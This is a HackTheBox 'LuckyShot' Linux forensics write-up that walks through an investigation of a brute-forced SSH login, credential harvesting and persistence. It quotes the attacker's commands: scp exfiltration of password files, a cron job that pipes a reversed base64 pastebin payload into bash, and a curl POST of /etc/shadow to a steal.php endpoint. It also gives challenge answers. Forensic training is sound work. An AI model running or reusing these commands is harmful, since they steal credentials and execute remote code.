---
title: Linux Forensics with LuckyShot (HTB Sherlock)
date: 2026-4-21 10:00:01 +/-0000
categories: [Education, Write Ups]
tags: [hackthebox, soc, linux, digital forensics, incident response]
author: cblake
description: A computer forensics investigation on a hijacked system.
comments: false
image:
  path: /assets/img/luckyshot/logo.png
  alt: Logo for the LuckyShot write-up.

---

LuckyShot is a straightforward and fun Linux forensics challenge on HackTheBox. It features a series of standard methods that hackers use to gain access to a system, extract critical information from that system, and maintain persistence to carry out further attacks.

We begin with this scenario:

```
The IT Manager of Techniqua-Solutions Corp. is responsible for managing the company’s infrastructure.
As part of his daily work, he frequently accesses company servers and workstations.
One morning, the IT Manager discovered that several critical company files were missing,
while others had been modified or replaced with unfamiliar ones.
Concerned about a potential breach, he reported the issue to the security team.

As an incident response analyst, your task is to investigate the case.
You have been provided with a forensic image of the IT Manager’s machine.
```

Let's take a look at what we have

## Triage
4 Directories:
1. **System's root directory**  - contains all typical linux system files
2. **bodyfile** - contains a text file that stores linux file metadata
3. **hash-executables** - a directory that contains hashes of all executables, and their directories, in md5 and sha1 formats.
4. **live_response** - The output of various commands ran on the system




## Analysis:

1. What method did the attacker use to gain access to the system?
	1. To answer this question we can first take in the context we have for this scenario, it's a linux system, and to gain access to a Linux system SSH is typically used. We can quickly inspect `/var/log/auth.log` and see if there is any information there.
	2. We find that there is a large section of brute force attempts occurring.
	3. ![img-description](assets/img/luckyshot/1.png)
	4. The brute force takes many attempts, but we see it eventually accept the password for the administrator account: ![img-description](assets/img/luckyshot/2.png)
	5. This makes our answer: `brute force`
2. At what time did the attacker successfully log in for the first time?
	1. From our findings of the previous question we see our answer to be, and searching for the very first instance of an accepted password on this account, our answer is: `2025-02-10 19:39:03`
3. Which user account was compromised by the attacker?
	1. The compromised account is the `administrator` account
4. What command was executed by the attacker to check user privileges?
	1. For bash commands it is easy to refer to the `.bash_history` file located on the corresponding user's directory. Here upon inspection we can find a command looking for the groups that the administrator account is assigned to.
	2. `groups administrator` is the command used to check privileges
5. What was the first tool the attacker downloaded to extract stored  credentials from the system?
	1. Still looking at the bash history we see a git clone request leading to `LaZagne.git`, and immediately changed into its directory after download. Upon further inspection of this GitHub repo, it is confirmed to be a credential harvester, so our answer is `LaZagne`
6. The attacker located sensitive files on the compromised system and transferred them to a remote machine. Which command-line tool was used for this exfiltration?
	1. Even further into the bash history, looking for anything related to the passwords retrieved by LaZagne, we can find Secure Copy being used to send it to the threat actor's ip address.
	2. `scp Passwords_Backup.txt Server_Credentials.txt kali@192.168.161.198:~/Desktop/` is the command we find, and this tells us the answer is `scp`
7. What IP did the attacker exfiltrate the files to?
	1. Continuing from the previous question, we see the IP address we are looking for, to be `192.168.161.198`
8. The attacker continued their exploitation and executed a malicious script on the victims machine. What is the name of that script?
	1. Shortly after the execution of the Secure Copy command, we see a script named `sys_monitor.sh` being executed as super user. This is the malicious script we are looking for: `sys_monitor.sh`
9. What is the SHA1 hash of the malware?
	1. Since we luckily have a directory of hash_executables, we can quickly refer to that to find the hash of this script.
	2. A quick command can take us directory to the hash in this file.
	3. ![img-description](assets/img/luckyshot/3.png)
	4. Making our answer `3ae5dea716a4f7bfb18046bfba0553ea01021c75`
10. The malware installed a component that pretends to be part of system network management but is actually running with root privileges. what is the name of the component?
	1. For this we can backtrack to the auth.log, where we can actually see some commands being executed by the threat actor, and in some of these commands we see services being ran as root. A network management system being ran by root in particular is `systemd-networkm.service` or `systemd-networkm`
11. The attacker modified several startup configuration files, each spawning a network listener on a different port at login. What is the name of the file that starts the listener on the lowest port number?
	1. When it comes to modifying a startup configuration this can usually occur on `.bashrc` for Linux systems.
	2. Which is where we find a netcat listener being initiated: ![img-description](assets/img/luckyshot/7.png)
	3. However, it is important to note that within auth.log we find that a certain file, `/etc/cron.d/syscheck` is modified with by the threat actor while executing `tee`, which if you're unfamiliar, copies standard input to a file. If we take a further look at this configuration file we see it continuously updating curl and exporting information to a pastebin. If we inspected this pastebin, and decrypted it based on the configuration file's contents, we see it telling the computer to extract more credentials.
	4. ![img-description](assets/img/luckyshot/4.png) Pastebin link found in the file
	5. ![img-description](assets/img/luckyshot/5.png) Decrypted
12. What is the username and hostname associated with the attacker?
	1. From the secure shell command we can find that the user is `kali` and the hostname is also `kali`
13. The attacker created a user for persistence, what is the name of the created user?
	1. From `auth.log` we see the `Regev` user, the only other account, is created by the threat actor, and has its permissions modified f or the persistence purposes.
14. At what exact timestamp was the new user created on the system?
	1. The command used to create this account is found at `2025-02-10T20:11:21.731285+02:00 LuckyShot sudo:     root : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash -G sudo,adm Regev`, which makes our time to be ``2025-02-10T20:11:21.731285`
15. The malware set up an automated process to fetch and execute a remote payload from a legitimate web service. What is the full command responsible for retrieving this payload?
	1. This payload was what we further investigated earlier, within `/etc/cron.d/syscheck`, which makes our answer `/1 * * * root command -v curl >/dev/null 2>&1 || (apt update && apt install -y curl) && curl -fsSL https://pastebin.com/raw/SAuEez0S | rev | base64 -d | bash`

16. The payload was used to extract more sensitive files. What was the command ran to extract the more sensitive file?
	1. For this we can look back at our decrypted payload, and the question asks for the more sensitive file, which is /etc/shadow. Making our command to be `base64 /etc/shadow | curl -X POST -d @- http://192.168.161.198/steal.php
`
